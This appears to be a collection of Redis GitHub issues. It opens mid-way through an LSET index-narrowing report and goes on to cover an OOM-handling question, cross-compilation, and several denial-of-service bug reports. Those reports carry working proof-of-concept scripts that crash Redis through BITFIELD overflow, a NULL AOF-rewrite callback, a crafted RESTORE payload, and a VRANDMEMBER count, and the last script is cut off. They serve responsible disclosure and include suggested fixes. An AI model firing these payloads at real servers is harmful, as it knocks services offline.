Per the documented `LSET` contract, any index whose absolute value is greater than or equal to the list length must be rejected with `ERR index out of range` and leave the list unchanged. `4294967296`, `4294967298`, `-4294967296` are all far outside the valid range for any real list, so all three `LSET` calls must reply `ERR index out of range` and the list must remain `a, b, c`. The list length must not change and no element may be overwritten.

## Additional information

**Root cause.** Integer-narrowing at a call-site type mismatch. `lsetCommand()` parses the index into a `long`, but `listTypeReplaceAtIndex()` is declared with an `int index` parameter. On LP64 platforms (`long` 64-bit, `int` 32-bit) any `long` index whose low 32 bits land inside the valid `[0, len)` / `[-len, len)` window survives truncation as a valid in-range `int` index, so the boundary check that `listTypeReplaceAtIndex` relies on (returning `0` via `lpSeek`/`quicklistReplaceAtIndex` when nothing is found) is bypassed for these aliased values. The negative case works the same way because the narrowing reinterprets the low 32 bits as a signed `int` (`-4294967296` → `0`).

**Affected versions / environment.** Verified locally on the current `unstable` branch:

```text
Commit:  d28dd44c49a48f007b57dd4f1b79066cb58f7132
Server:  Redis server v=255.255.255 sha=d28dd44c:0 malloc=libc bits=64 build=8a0c4e91e069711c
Platform: 64-bit Linux/GCC (LP64; long = 8 bytes, int = 4 bytes)
Encodings tested: listpack (default small list) and quicklist (forced via list-max-listpack-size 1)
```

On ILP32 targets where `long` and `int` are both 32-bit, `getLongFromObjectOrReply()` would reject the value as out of `long` range first, masking the bug; the issue is specific to 64-bit (`bits=64`) builds, which is the dominant production target per `SECURITY.md`.

**Impact.** Authenticated remote data-integrity violation. Any client authorized to run `LSET` on a list key can overwrite arbitrary existing elements with attacker-chosen values using indexes that the application believes will be rejected as out of range. This breaks index-boundary guarantees that callers may rely on for integrity (e.g. guarding specific slots, ring-buffer/queue slots that must not be touched by callers supplying validated offsets). Combined with `keyspace notifications`/replication the corrupted element is propagated to replicas and AOF/RDB, so the corruption persists. No crash or memory-safety violation was observed — purely a logical write out of the documented contract.

**Suggested fix.** Make the index type consistent end-to-end so no narrowing occurs. Change `listTypeReplaceAtIndex()` to accept a `long index` (matching `lsetCommand`'s parsed type), and propagate `long` through `quicklistReplaceAtIndex()` and the `lpSeek()` call. If any lower-level API genuinely requires a narrower type, validate explicitly at the boundary in `lsetCommand` before calling — e.g. reject with `ERR index out of range` when the parsed `long` index is outside the list length (the command already has the type and can compute length), or range-check against `INT_MIN`/`INT_MAX` before the narrowing call. The cleanest minimal fix is to drop the `int` parameter entirely in favor of `long`:

```c
int listTypeReplaceAtIndex(robj *o, long index, robj *value) {
    ...
    if (o->encoding == OBJ_ENCODING_QUICKLIST) {
        quicklist *ql = o->ptr;
        replaced = quicklistReplaceAtIndex(ql, index, vstr, vlen);  /* signature widened to long */
    } else if (o->encoding == OBJ_ENCODING_LISTPACK) {
        unsigned char *p = lpSeek(o->ptr, index);
        ...
    }
    ...
}
```

title: [QUESTION] Should `tryCreateStringObject()` be fully recoverable on allocation failure?
author: vitahlin
body:
## Question

I noticed that `tryCreateStringObject()` is documented as an allocation API that can return `NULL`, but some internal paths still call panic-on-OOM constructors.

I wanted to ask whether this is intentional, or whether this path should be made fully recoverable.

## Code references

`tryCreateRawStringObject()` uses `sdstrynewlen()` first, but then calls `createObject()`:

https://github.com/redis/redis/blob/e5fb6863dbd536ff7f22fdf6742a5744b691efb8/src/object.c#L345-L350

`tryCreateStringObject()` uses `createEmbeddedStringObject()` for short strings:

https://github.com/redis/redis/blob/e5fb6863dbd536ff7f22fdf6742a5744b691efb8/src/object.c#L352-L358

`createObject()` calls `zmalloc()`:

https://github.com/redis/redis/blob/e5fb6863dbd536ff7f22fdf6742a5744b691efb8/src/object.c#L107-L116

`createEmbeddedStringObject()` calls `zmalloc_usable()`:

https://github.com/redis/redis/blob/e5fb6863dbd536ff7f22fdf6742a5744b691efb8/src/object.c#L221-L228

`zmalloc_usable()` invokes the OOM handler instead of returning `NULL`:

https://github.com/redis/redis/blob/e5fb6863dbd536ff7f22fdf6742a5744b691efb8/src/zmalloc.c#L298-L304

One caller appears to expect `tryCreateStringObject()` to return `NULL` on allocation failure:

https://github.com/redis/redis/blob/e5fb6863dbd536ff7f22fdf6742a5744b691efb8/src/rdb.c#L551-L558

## Concern

For short strings, `tryCreateStringObject()` calls `createEmbeddedStringObject()`, which uses `zmalloc_usable()` and can panic on OOM instead of returning `NULL`.

For longer strings, `tryCreateRawStringObject()` can allocate the SDS successfully with `sdstrynewlen()`, but then `createObject()` can still panic through `zmalloc()`. If that second allocation fails, the function cannot return `NULL`, and the already allocated SDS is not cleaned up on that path.

## Expected direction?

Should `tryCreateStringObject()` be changed so that all allocations in this API are recoverable?

One possible approach would be:

- add a `tryCreateObject()` helper using `ztrymalloc()`;
- add a `tryCreateEmbeddedStringObject()` helper using `ztrymalloc_usable()`;
- make `tryCreateRawStringObject()` free the SDS if object allocation fails;
- preserve the current EMBSTR/RAW encoding behavior.

Before preparing a patch, I wanted to confirm whether the current behavior is intentional or if making this API fully recoverable would be preferred.

title: [BUG]Cross-compilation fails because deps/Makefile doesn't pass --host to jemalloc and tests/modules forcibly overrides CC
author: Selenophilia37
body:
**Describe the bug**

1. When CC is set to a cross-compiler (e.g., via environment or make CC=...or CROSS_COMPILE=...), configure still detects the build system as the host because --host is missing.

    here are some logs:
    ```
    checking for gcc... aarch64-poky-linux-gcc
    checking whether the C compiler works... yes
    checking for C compiler default output file name... a.out
    checking for suffix of executables...
    checking whether we are cross compiling... configure: error: in `/home/lin.zijian/redis-8.8.0/deps/jemalloc':
    configure: error: cannot run C compiled programs.
    If you meant to cross compile, use `--host'.
    See `config.log' for more details
    In file included from server.h:58,
                     from threads_mngr.c:16:
    zmalloc.h:33:10: fatal error: jemalloc/jemalloc.h: No such file or directory
     #include <jemalloc/jemalloc.h>
    compilation terminated.
    ```


2. In tests/modules/Makefile, there is logic that resets CC to gcc when SANITIZER is not set to memory and uname_S is not Linux:

    ```
    ifeq ($(uname_S),Linux)
    ifneq ($(SANITIZER),memory)
    	LD = gcc
    	CC = gcc
    endif
    endif
    ```

    This force-override ignores the user-provided CC (e.g., aarch64-poky-linux-gcc), but CFLAGS and LDFLAGS still contain --sysroot pointing to the target sysroot. The result is:
    
    - The host's gcc is used (which is x86_64)
    - It tries to parse aarch64 sysroot headers (e.g., /usr/include/bits/wordsize.h)
    - Leads to errors like: error: unknown type name '__ssize_t' and #error "__WORDSIZE is not defined"

**To reproduce**

1. Setup cross-compilation environment (e.g., source Poky SDK):

    `source /opt/poky/3.1.26/environment-setup-aarch64-poky-linux`

2. run make

    `make CROSS_COMPILE=aarch64-poky-linux- HOST=aarch64-poky-linux CFLAGS="--sysroot=/opt/poky/3.1.26/sysroots/aarch64-poky-linux" CXXFLAGS="--sysroot=/opt/poky/3.1.26/sysroots/aarch64-poky-linux" LDFLAGS="--sysroot=/opt/poky/3.1.26/sysroots/aarch64-poky-linux"`

**Environment**

- Redis version: 8.8.0
- Host system: Ubuntu 22.04 (x86_64)
- Target system: aarch64-poky-linux (Yocto/Poky 3.1.26 toolchain)
- Compiler: aarch64-poky-linux-gcc (gcc 8.3.0)

**Additional information**

I tried the following methods and was able to successfully complete the build, and I am so sorry that I cannot provide more formal modification suggestions

Comment out the following::
https://github.com/redis/redis/blob/5a693aaed0842c4eef21c706b79fa49938ca9f6c/tests/modules/Makefile#L30-L35

Add `HOST=aarch64-poky-linux` to the make args and change https://github.com/redis/redis/blob/5a693aaed0842c4eef21c706b79fa49938ca9f6c/deps/Makefile#L149 into:

`cd jemalloc && ./configure --host=${HOST} --disable-cxx --with-version=5.3.0-0-g0 --with-lg-quantum=3 --disable-cache-oblivious --with-jemalloc-prefix=je_ CFLAGS="$(JEMALLOC_CFLAGS)" LDFLAGS="$(JEMALLOC_LDFLAGS)" $(JEMALLOC_CONFIGURE_OPTS)`

title: [BUG] Redis BITFIELD `#offset` Signed Overflow DoS
author: sdjasj
body:
**Describe the bug**

Redis `BITFIELD` and `BITFIELD_RO` support the `#<offset>` syntax, where the element offset is multiplied by the current bitfield width to produce the real bit offset. The runtime code performs that multiplication in signed `long long` before checking for negative values or the maximum string length:

```c
/* src/bitops.c:getBitOffsetFromArgument() */
if (usehash) loffset *= bits;

if (loffset < 0 || (!mustObeyClient(c) && (loffset >> 3) >= server.proto_max_bulk_len))
{
    addReplyError(c,err);
    return C_ERR;
}
```

If a client supplies a `#offset` that is accepted by `string2ll()` but overflows after multiplication by the bit width, `loffset *= bits` triggers signed integer overflow. UBSAN builds, or hardened builds that trap signed overflow, abort the Redis process and cause a remotely triggerable denial of service.

**To reproduce**

Affected Runtime Code:

- `src/bitops.c:714`: `getBitOffsetFromArgument()` parses bit offsets for bit commands.
- `src/bitops.c:721`: enables multiplication for `BITFIELD` `#<offset>` syntax.
- `src/bitops.c:730`: sink, `loffset *= bits` is evaluated before bounds checks.
- `src/bitops.c:1931`: `BITFIELD`/`BITFIELD_RO` parsing calls this sink.

A client allowed to run `BITFIELD_RO` or `BITFIELD` sends a bitfield subcommand with `#offset`. For `i64`, the field width is 64, and the following offset is `floor(LLONG_MAX / 64) + 1`:

```sh
redis-cli BITFIELD_RO k GET i64 '#144115188075855872'
```

The same sink is reachable through the write command name as well:

```sh
redis-cli BITFIELD k GET i64 '#144115188075855872'
```

POC:

```bash
#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
TMP="$(mktemp -d /tmp/redis-bitfield-offset-overflow.XXXXXX)"
SRC="${TMP}/srcroot"

cleanup() {
    pkill -P "$$" 2>/dev/null || true
    rm -rf "${TMP}"
}
trap cleanup EXIT

need() {
    if ! command -v "$1" >/dev/null 2>&1; then
        echo "missing required command: $1" >&2
        exit 1
    fi
}

need make
need tar
need grep

echo "[1/4] Copying current Redis workspace to ${SRC}"
mkdir -p "${SRC}"
(
    cd "${ROOT}"
    tar \
        --exclude='.git' \
        --exclude='.bug_agent' \
        --exclude='bug' \
        --exclude='chain' \
        --exclude='real_bug' \
        --exclude='src/.make-*' \
        --exclude='deps/.make-*' \
        --exclude='deps/*/.make-*' \
        --exclude='src/*.o' \
        --exclude='src/*.d' \
        --exclude='src/redis-server' \
        --exclude='src/redis-server-*' \
        --exclude='src/redis-cli' \
        --exclude='src/redis-cli-*' \
        -cf - .
) | tar -C "${SRC}" -xf -

echo "[2/4] Building temporary UBSAN Redis"
make -C "${SRC}/src" \
    SANITIZER=undefined \
    MALLOC=libc \
    OPTIMIZATION=-O0 \
    PROG_SUFFIX=-ubsan \
    redis-server-ubsan redis-cli-ubsan \
    -j"$(getconf _NPROCESSORS_ONLN 2>/dev/null || echo 2)" >/dev/null

SERVER="${SRC}/src/redis-server-ubsan"
CLI="${SRC}/src/redis-cli-ubsan"
OFFSET="#144115188075855872"

run_trigger() {
    local name="$1"
    local port="$2"
    shift 2

    local rundir="${TMP}/${name}"
    local log="${rundir}/server.log"
    mkdir -p "${rundir}"

    echo "[3/4] Triggering ${name}: $*"
    UBSAN_OPTIONS=print_stacktrace=1:halt_on_error=1 \
        "${SERVER}" --port "${port}" --bind 127.0.0.1 \
        --save '' --appendonly no --dir "${rundir}" --daemonize no \
        >"${log}" 2>&1 &
    local spid=$!

    local ready=0
    for _ in $(seq 1 100); do
        if kill -0 "${spid}" 2>/dev/null && "${CLI}" -p "${port}" PING >/dev/null 2>&1; then
            ready=1
            break
        fi
        sleep 0.05
    done
    if [[ "${ready}" -ne 1 ]]; then
        echo "FAILED: Redis did not start for ${name}" >&2
        tail -120 "${log}" >&2 || true
        exit 1
    fi

    set +e
    "${CLI}" -p "${port}" "$@" >"${rundir}/cli.out" 2>"${rundir}/cli.err"
    local cli_rc=$?
    sleep 0.5
    "${CLI}" -p "${port}" PING >"${rundir}/ping.out" 2>"${rundir}/ping.err"
    local ping_rc=$?
    kill -0 "${spid}" 2>/dev/null
    local alive_rc=$?
    set -e

    echo "    redis-cli exit: ${cli_rc}"
    if [[ -s "${rundir}/cli.err" ]]; then
        sed 's/^/    cli: /' "${rundir}/cli.err"
    fi
    if [[ -s "${rundir}/ping.err" ]]; then
        sed 's/^/    ping: /' "${rundir}/ping.err"
    fi
    grep -En "runtime error|signed integer overflow|bitops.c:730|Ready to accept" "${log}" \
        | sed 's/^/    log: /' || true

    if [[ "${alive_rc}" -eq 0 ]]; then
        "${CLI}" -p "${port}" SHUTDOWN NOSAVE >/dev/null 2>&1 || kill "${spid}" 2>/dev/null || true
        echo "FAILED: ${name} server stayed alive" >&2
        exit 1
    fi
    if [[ "${ping_rc}" -eq 0 ]]; then
        echo "FAILED: ${name} server still answered PING" >&2
        exit 1
    fi
    if ! grep -q "bitops.c:730:.*runtime error: signed integer overflow" "${log}"; then
        echo "FAILED: ${name} did not report the expected bitops.c:730 UBSAN overflow" >&2
        tail -120 "${log}" >&2 || true
        exit 1
    fi

    wait "${spid}" 2>/dev/null || true
    echo "    ${name}: verified signed-overflow abort"
}

run_trigger "bitfield_ro" "${PORT1:-6415}" BITFIELD_RO k GET i64 "${OFFSET}"
run_trigger "bitfield" "${PORT2:-6416}" BITFIELD k GET i64 "${OFFSET}"

echo "[4/4] PoC completed: both BITFIELD hash-offset triggers killed the UBSAN server."
```

**Expected behavior**

I verified the issue against the current source by building a temporary UBSAN Redis server and sending Redis commands through `redis-cli`. Both `BITFIELD_RO` and `BITFIELD` closed the connection, made subsequent `PING` fail, and logged:

```text
bitops.c:730:26: runtime error: signed integer overflow: 64 * 144115188075855872 cannot be represented in type 'long long int'
```

**Additional information**

Check for overflow before evaluating `loffset *= bits`. For example, when `usehash` is true, reject `loffset > LLONG_MAX / bits` before multiplying. A checked-multiplication helper would also work, while keeping the existing negative-value and `server.proto_max_bulk_len` bounds checks.

title: [BUG] Vector Set pure AOF rewrite NULL callback dereference child-process DoS
author: sdjasj
body:
**Describe the bug**

The built-in `vectorset` module registers its module data type with a NULL `aof_rewrite` method:

```c
// modules/vector-sets/vset.c:2291-2298
RedisModuleTypeMethods tm = {
    .version = REDISMODULE_TYPE_METHOD_VERSION,
    .rdb_load = VectorSetRdbLoad,
    .rdb_save = VectorSetRdbSave,
    .aof_rewrite = NULL,
    .mem_usage = VectorSetMemUsage,
    .free = VectorSetFree,
    .digest = VectorSetDigest
};
```

`RM_CreateDataType()` accepts that NULL method and stores it in the runtime `moduleType`:

```c
// src/module.c:7525-7528
mt->rdb_load = tms->rdb_load;
mt->rdb_save = tms->rdb_save;
mt->aof_rewrite = tms->aof_rewrite;
mt->mem_usage = tms->mem_usage;
```

When Redis performs a pure AOF rewrite (`aof-use-rdb-preamble no`) over a database containing a Vector Set key, the AOF rewrite path unconditionally invokes that callback:

```c
// src/aof.c:2487-2492
int rewriteModuleObject(rio *r, robj *key, robj *o, int dbid) {
    RedisModuleIO io;
    moduleValue *mv = o->ptr;
    moduleType *mt = mv->type;
    moduleInitIOContext(&io, &mt->entity, r, key, dbid);
    mt->aof_rewrite(&io,key,mv->value);
```

A remote client that can create a Vector Set key and trigger AOF rewrite can therefore crash the AOF rewrite child process with a NULL function pointer dereference. In the verified run the parent Redis process survived, but AOF rewrite failed and `aof_last_bgrewrite_status` became `err`. Repeated triggers can keep AOF compaction/rewrite unavailable and consume fork/rewrite resources.

**To reproduce**

Trigger conditions:

- The Redis binary includes built-in Vector Sets. The existing `src/redis-server` in this repository does.
- AOF is enabled and pure AOF rewrite is selected: `appendonly yes` and `aof-use-rdb-preamble no`.
- The attacker can run `VADD` to create a Vector Set key.
- The attacker can run `BGREWRITEAOF`, or the instance is configured to auto-trigger AOF rewrite.

Minimal trigger:

```text
VADD vk VALUES 2 1 2 elem1
BGREWRITEAOF
```

Run
```bash
#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "$SCRIPT_DIR/../.." && pwd)"
REDIS_SERVER="$ROOT_DIR/src/redis-server"
REDIS_CLI="$ROOT_DIR/src/redis-cli"

if [[ ! -x "$REDIS_SERVER" || ! -x "$REDIS_CLI" ]]; then
  echo "[-] Missing built Redis binaries under $ROOT_DIR/src"
  exit 1
fi

TMPDIR="$(mktemp -d /tmp/redis-vset-aof-null.XXXXXX)"
PORT=$((30000 + RANDOM % 20000))
PIDFILE="$TMPDIR/redis.pid"
LOGFILE="$TMPDIR/redis.log"

cleanup() {
  "$REDIS_CLI" -p "$PORT" shutdown nosave >/dev/null 2>&1 || true
  if [[ "${KEEP_TMP:-0}" != "1" ]]; then
    rm -rf "$TMPDIR"
  else
    echo "[*] Keeping temporary dir: $TMPDIR"
  fi
}
trap cleanup EXIT

echo "[*] Repository: $ROOT_DIR"
echo "[*] Temporary dir: $TMPDIR"
echo "[*] Redis port: $PORT"

"$REDIS_SERVER" \
  --port "$PORT" \
  --bind 127.0.0.1 \
  --protected-mode no \
  --dir "$TMPDIR" \
  --logfile "$LOGFILE" \
  --pidfile "$PIDFILE" \
  --daemonize yes \
  --save "" \
  --appendonly yes \
  --aof-use-rdb-preamble no

for _ in $(seq 1 50); do
  if "$REDIS_CLI" -p "$PORT" ping >/dev/null 2>&1; then
    break
  fi
  sleep 0.1
done

if ! "$REDIS_CLI" -p "$PORT" ping >/dev/null 2>&1; then
  echo "[-] Redis did not start"
  tail -80 "$LOGFILE" || true
  exit 1
fi

if ! "$REDIS_CLI" -p "$PORT" COMMAND INFO VADD | grep -q '^VADD$'; then
  echo "[-] VADD command is not available; this binary may not include Vector Sets"
  exit 2
fi

echo "[*] Creating a Vector Set key"
"$REDIS_CLI" -p "$PORT" --raw VADD vk VALUES 2 1 2 elem1
echo "[*] Key type: $("$REDIS_CLI" -p "$PORT" --raw TYPE vk)"

echo "[*] Triggering pure AOF rewrite"
"$REDIS_CLI" -p "$PORT" --raw BGREWRITEAOF

for _ in $(seq 1 100); do
  in_progress="$("$REDIS_CLI" -p "$PORT" INFO persistence | awk -F: '/^aof_rewrite_in_progress:/{gsub(/\r/,"",$2); print $2}')"
  [[ "$in_progress" == "0" ]] && break
  sleep 0.1
done

status="$("$REDIS_CLI" -p "$PORT" INFO persistence | awk -F: '/^aof_last_bgrewrite_status:/{gsub(/\r/,"",$2); print $2}')"
failures="$("$REDIS_CLI" -p "$PORT" INFO persistence | awk -F: '/^aof_rewrites_consecutive_failures:/{gsub(/\r/,"",$2); print $2}')"

echo "[*] aof_last_bgrewrite_status: $status"
echo "[*] aof_rewrites_consecutive_failures: $failures"
echo "[*] Crash markers:"
grep -E 'crashed by signal: 11|Accessing address: \\(nil\\)|Background AOF rewrite terminated by signal 11|rewriteObject|rewriteAppendOnlyFile' "$LOGFILE" || true

if [[ "$status" == "err" ]] && \
   grep -q 'crashed by signal: 11' "$LOGFILE" && \
   grep -q 'Background AOF rewrite terminated by signal 11' "$LOGFILE"; then
  echo "[+] VULNERABLE: Vector Set pure AOF rewrite crashed the rewrite child process"
  exit 0
fi

echo "[-] Not reproduced. The binary may be fixed or not using the vulnerable rewrite path."
exit 2

```

**Expected behavior**

Verified with the existing repository binaries, without rebuilding.

Key output:

```text
VADD vk VALUES 2 1 2 elem1
1
TYPE vk
vectorset
BGREWRITEAOF
Background append only file rewriting started
aof_last_bgrewrite_status:err
aof_rewrites_consecutive_failures:1
```

Crash evidence from the server log:

```text
Redis 255.255.255 crashed by signal: 11, si_code: 1
Accessing address: (nil)
redis-aof-rewrite ... rewriteObject+0x150
redis-aof-rewrite ... rewriteAppendOnlyFileRio+0x67c
redis-aof-rewrite ... rewriteAppendOnlyFileBackground+0x1d7
Background AOF rewrite terminated by signal 11
```

**Additional information**

The preferred fix is to implement `VectorSetAofRewrite` and emit the `VADD` command sequence needed to rebuild the Vector Set during pure AOF rewrite.

The core should also defend the hook boundary: `rewriteModuleObject()` should check `mt->aof_rewrite != NULL` before calling it. If a module type cannot support pure AOF rewrite, Redis should return a recoverable rewrite error, force the RDB preamble path, or reject the registration/configuration combination instead of calling a NULL function pointer.

title: [BUG] Vector Set RESTORE empty object VSIM crash
author: sdjasj
body:
**Describe the bug**

`RESTORE` accepts a crafted Vector Set module payload with `elements = 0`. Normal command paths delete a Vector Set when its last element is removed, but `VectorSetRdbLoad()` creates and returns a live module value with `vset->hnsw->node_count == 0`.

When a client then runs `VSIM` against this key with a positive `COUNT`, `VSIM_execute()` clamps `ef` to the zero node count. It allocates zero-length `neighbors` and `distances` arrays, calls `hnsw_search()` with `k == 0`, and stores the signed `-1` error return in an unsigned `found`. The result loop treats `found` as a huge positive value and indexes the zero-length arrays, crashing Redis with SIGSEGV.

- `modules/vector-sets/vset.c:1972` to `modules/vector-sets/vset.c:1998`: `VectorSetRdbLoad()` loads attacker-controlled `elements` and creates the Vector Set object without rejecting `elements == 0`.
- `modules/vector-sets/vset.c:2051`: the `while (elements--)` loop is skipped for zero elements, so the object remains empty but valid.
- `modules/vector-sets/vset.c:830` to `modules/vector-sets/vset.c:838`: `VSIM_execute()` derives `ef` from user `COUNT`, then clamps it to `vset->hnsw->node_count`, producing `ef == 0`.
- `modules/vector-sets/hnsw.c:1213`: `hnsw_search_with_filter()` returns `-1` when `k == 0`.
- `modules/vector-sets/vset.c:839` and `modules/vector-sets/vset.c:847`: the `int` search return is assigned to `unsigned int found`.
- `modules/vector-sets/vset.c:866` to `modules/vector-sets/vset.c:868`: the reply loop reads `distances[0]` / `neighbors[0]` despite zero allocation.



**To reproduce**

1. The attacker can load a crafted serialized value through `RESTORE`, or can otherwise provide a malicious RDB/replication payload processed by the Vector Set RDB loader.
2. The payload declares a valid Vector Set module object with a nonzero dimension and `elements = 0`.
3. The attacker runs `VSIM <key> VALUES 2 1 0 COUNT 1 NOTHREAD` or an equivalent query with positive `COUNT`.

Verified with the repository's existing `src/redis-server` binary, without rebuilding Redis.

The PoC builds a 30-byte DUMP payload:

- RDB type `RDB_TYPE_MODULE_2`
- module id `vectorset` encoding version `0`
- `dim = 2`
- `elements = 0`
- `hnsw_config = 16 << 8`
- `save_flags = 0`
- module EOF, RDB version, and zero checksum

Observed result:

```text
RESTORE reply: b'+OK\r\n'
TYPE reply: b'+vectorset\r\n'
VCARD reply: b':0\r\n'
VSIM reply before crash: b''
Redis crashed by signal: 11
VSIM_execute
cmd=VSIM
```

Run:
```bash
python3 poc.py
```
```python3
#!/usr/bin/env python3
import os
import socket
import struct
import subprocess
import sys
import tempfile
import time


def repo_root():
    return os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))


def enc_len(n):
    if n < (1 << 6):
        return bytes([n])
    if n < (1 << 14):
        return bytes([0x40 | (n >> 8), n & 0xFF])
    if n <= 0xFFFFFFFF:
        return b"\x80" + struct.pack(">I", n)
    return b"\x81" + struct.pack(">Q", n)


def save_unsigned(n):
    return enc_len(2) + enc_len(n)


def module_type_id(name="vectorset", encver=0):
    charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
    value = 0
    for ch in name:
        value = (value << 6) | charset.index(ch)
    return (value << 10) | encver


def build_empty_vectorset_payload():
    payload = bytearray()
    payload.append(7)  # RDB_TYPE_MODULE_2
    payload += enc_len(module_type_id())

    payload += save_unsigned(2)        # dim
    payload += save_unsigned(0)        # vulnerable field: elements
    payload += save_unsigned(16 << 8)  # quant=none, HNSW M=16
    payload += save_unsigned(0)        # save_flags

    payload += enc_len(0)              # RDB_MODULE_OPCODE_EOF
    payload += struct.pack("<H", 14)   # RDB version
    payload += b"\x00" * 8             # zero DUMP checksum is accepted by RESTORE
    return bytes(payload)


def pack_command(*args):
    out = ("*%d\r\n" % len(args)).encode()
    for arg in args:
        if isinstance(arg, str):
            arg = arg.encode()
        elif not isinstance(arg, (bytes, bytearray)):
            arg = str(arg).encode()
        out += ("$%d\r\n" % len(arg)).encode() + bytes(arg) + b"\r\n"
    return out


def redis_command(port, args, timeout=3.0):
    with socket.create_connection(("127.0.0.1", port), timeout=timeout) as sock:
        sock.settimeout(timeout)
        sock.sendall(pack_command(*args))
        try:
            return sock.recv(4096)
        except socket.timeout:
            return b""


def find_free_port():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def wait_until_ready(port, proc, deadline):
    while time.time() < deadline:
        if proc.poll() is not None:
            return False
        try:
            if redis_command(port, ["PING"], timeout=0.2).startswith(b"+PONG"):
                return True
        except OSError:
            time.sleep(0.05)
    return False


def log_tail(path, max_bytes=5000):
    if not os.path.exists(path):
        return ""
    with open(path, "rb") as f:
        data = f.read()
    return data[-max_bytes:].decode("utf-8", "replace")


def main():
    root = repo_root()
    redis_server = os.environ.get("REDIS_SERVER", os.path.join(root, "src", "redis-server"))
    if not os.path.exists(redis_server):
        print(f"[-] redis-server not found: {redis_server}", file=sys.stderr)
        return 1

    port = find_free_port()
    workdir = tempfile.mkdtemp(prefix="redis-vset-empty-vsim.")
    log_path = os.path.join(workdir, "redis.log")
    proc = subprocess.Popen(
        [
            redis_server,
            "--port", str(port),
            "--bind", "127.0.0.1",
            "--protected-mode", "no",
            "--dir", workdir,
            "--save", "",
            "--appendonly", "no",
            "--logfile", log_path,
            "--daemonize", "no",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    try:
        if not wait_until_ready(port, proc, time.time() + 5):
            print("[-] Redis did not become ready. Log tail:")
            print(log_tail(log_path))
            return 1

        payload = build_empty_vectorset_payload()
        print(f"[+] Redis pid={proc.pid} port={port}")
        print(f"[+] Crafted Vector Set DUMP payload length={len(payload)} bytes")
        print(f"[+] Log path: {log_path}")

        restore_reply = redis_command(port, [b"RESTORE", b"emptyv", b"0", payload, b"REPLACE"])
        type_reply = redis_command(port, [b"TYPE", b"emptyv"])
        vcard_reply = redis_command(port, [b"VCARD", b"emptyv"])
        print(f"[+] RESTORE reply: {restore_reply!r}")
        print(f"[+] TYPE reply: {type_reply!r}")
        print(f"[+] VCARD reply: {vcard_reply!r}")

        if not restore_reply.startswith(b"+OK") or not type_reply.startswith(b"+vectorset") or not vcard_reply.startswith(b":0"):
            print("[-] Failed to create a zero-cardinality Vector Set; PoC cannot continue.")
            return 1

        try:
            vsim_reply = redis_command(
                port,
                [b"VSIM", b"emptyv", b"VALUES", b"2", b"1", b"0", b"COUNT", b"1", b"NOTHREAD"],
                timeout=3,
            )
            print(f"[+] VSIM reply before crash: {vsim_reply!r}")
        except OSError as exc:
            print(f"[+] VSIM connection error before crash: {exc!r}")

        try:
            proc.wait(timeout=10)
        except subprocess.TimeoutExpired:
            print("[-] Redis is still running; expected VSIM crash did not occur.")
            return 1

        log = open(log_path, "r", errors="replace").read() if os.path.exists(log_path) else ""
        indicators = ["crashed by signal: 11", "VSIM_execute", "cmd=VSIM", 'argv[8]: \'"NOTHREAD"\'']
        missing = [item for item in indicators if item not in log]
        if proc.returncode == 0 or missing:
            print(f"[-] Redis exited with status {proc.returncode}, but expected crash evidence was missing: {missing}")
            print(log_tail(log_path))
            return 1

        print(f"[+] PASS: Redis crashed during VSIM on the restored empty Vector Set. Exit status={proc.returncode}")
        for line in log.splitlines():
            if "crashed by signal" in line or "VSIM_execute" in line or "cmd=VSIM" in line:
                print(line)
        print(f"[+] Full crash log kept at: {log_path}")
        return 0
    finally:
        if proc.poll() is None:
            try:
                redis_command(port, [b"SHUTDOWN", b"NOSAVE"], timeout=1)
            except Exception:
                proc.terminate()
            try:
                proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                proc.kill()


if __name__ == "__main__":
    sys.exit(main())

```
**Expected behavior**

Reject zero-element Vector Set module payloads in `VectorSetRdbLoad()` because normal runtime mutation deletes empty Vector Set keys. Also harden `VSIM_execute()` by returning an empty reply when `vset->hnsw->node_count == 0`, preserving the signed `hnsw_search()` return value, and treating negative returns as errors or empty results before entering the reply loop.

title: [BUG] Vector Set RESTORE Duplicate HNSW ID UAF
author: sdjasj

title: [BUG] Redis crash via VRANDMEMBER LLONG_MIN count
author: sdjasj
body:
**Describe the bug**

The current runtime code contains a remotely triggerable denial-of-service bug. When a non-empty vector set key exists, this command crashes `redis-server`:

```text
VRANDMEMBER <key> -9223372036854775808
```

Bug location: (redis/modules/vector-sets/vset.c:1632)

```c
int allow_duplicates = (count < 0);
long long abs_count = (count < 0) ? -count : count;
...
RedisModule_ReplyWithArray(ctx, abs_count);
```

For `count == LLONG_MIN`, `-count` is not representable as `long long`, so this is undefined behavior. In the verified environment, `abs_count` stays negative.

The negative value reaches the module reply API: [src/module.c](https://github.com/redis/redis/blob/d28dd44c49a48f007b57dd4f1b79066cb58f7132/src/module.c#L3233)

```c
addReplyArrayLen(c,len);
```

Redis core then aborts on this assertion: [src/networking.c](https://github.com/redis/redis/blob/d28dd44c49a48f007b57dd4f1b79066cb58f7132/src/networking.c#L1208)

```c
serverAssert(length >= 0);
```

**To reproduce**

```
#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
# Prefer the plain binaries, fall back to the -asan (sanitizer) build when
# that's the only one compiled in the repo.
if [[ -x "$ROOT/src/redis-server" ]]; then
    SERVER="$ROOT/src/redis-server"
elif [[ -x "$ROOT/src/redis-server-asan" ]]; then
    SERVER="$ROOT/src/redis-server-asan"
else
    echo "[-] Missing executable src/redis-server (or src/redis-server-asan)" >&2
    exit 1
fi
if [[ -x "$ROOT/src/redis-cli" ]]; then
    CLI="$ROOT/src/redis-cli"
elif [[ -x "$ROOT/src/redis-cli-asan" ]]; then
    CLI="$ROOT/src/redis-cli-asan"
else
    echo "[-] Missing executable src/redis-cli (or src/redis-cli-asan)" >&2
    exit 1
fi
echo "[+] Using server: $SERVER"

pick_port() {
    for _ in $(seq 1 50); do
